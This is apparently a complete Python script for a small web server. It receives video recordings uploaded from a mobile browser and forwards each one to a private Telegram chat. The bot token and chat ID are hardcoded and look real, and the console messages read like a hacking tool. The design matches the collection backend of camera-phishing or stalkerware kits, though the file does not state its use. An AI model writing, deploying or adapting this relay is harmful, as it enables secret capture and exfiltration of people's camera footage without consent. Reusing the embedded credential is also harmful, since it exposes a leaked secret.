import http.server
import json
import os
import urllib.request
import urllib.parse

# 1. PASTE YOUR TELEGRAM DETAILS HERE (Inside the quotation marks)
TELEGRAM_BOT_TOKEN = "8837215809:AAEJJ05BIjul96LJtHP_ZiKz_lnyk5a8esA"
TELEGRAM_CHAT_ID = "7787904819"

class AVRecordingHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/upload-video':
            content_length = int(self.headers['Content-Length'])
            raw_data = self.rfile.read(content_length)
            
            try:
                boundary = self.headers['Content-Type'].split("=")[1].encode()
                header_end = raw_data.find(b'\r\n\r\n') + 4
                file_end = raw_data.rfind(boundary) - 4
                video_bytes = raw_data[header_end:file_end]
                
                print("[*] Video received from browser. Forwarding to Telegram...")
                
                # 2. Build a multipart form packet for Telegram's API
                boundary_str = "----WebKitFormBoundaryTelegramTransmission"
                body = []
                
                # Append the chat ID parameter
                body.append(f'--{boundary_str}'.encode())
                body.append(f'Content-Disposition: form-data; name="chat_id"'.encode())
                body.append(b'')
                body.append(TELEGRAM_CHAT_ID.encode())
                
                # Append the binary video file content
                body.append(f'--{boundary_str}'.encode())
                body.append(f'Content-Disposition: form-data; name="video"; filename="user_recording.webm"'.encode())
                body.append(b'Content-Type: video/webm')
                body.append(b'')
                body.append(video_bytes)
                body.append(f'--{boundary_str}--'.encode())
                
                payload = b'\r\n'.join(body)
                
                # 3. Fire the request directly to Telegram's official API
                telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                req = urllib.request.Request(telegram_url, data=payload)
                req.add_header('Content-Type', f'multipart/form-data; boundary={boundary_str}')
                
                with urllib.request.urlopen(req) as response:
                    result = response.read()
                    print("[+] Success! Video successfully pushed to your Telegram Bot chat.")
                
                # Respond cleanly back to the mobile browser application
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Transmission to cloud destination complete.")
                
            except Exception as e:
                print(f"[-] Error routing media packet to Telegram: {e}")
                self.send_error(500, "Internal Server Error during cloud upload")
        else:
            self.send_error(404, "Not Found")

port = int(os.environ.get("PORT", 8443))
server_address = ('0.0.0.0', port)
httpd = http.server.HTTPServer(server_address, AVRecordingHandler)

print(f"[*] Cloud Gateway running on port {port}")
httpd.serve_forever()
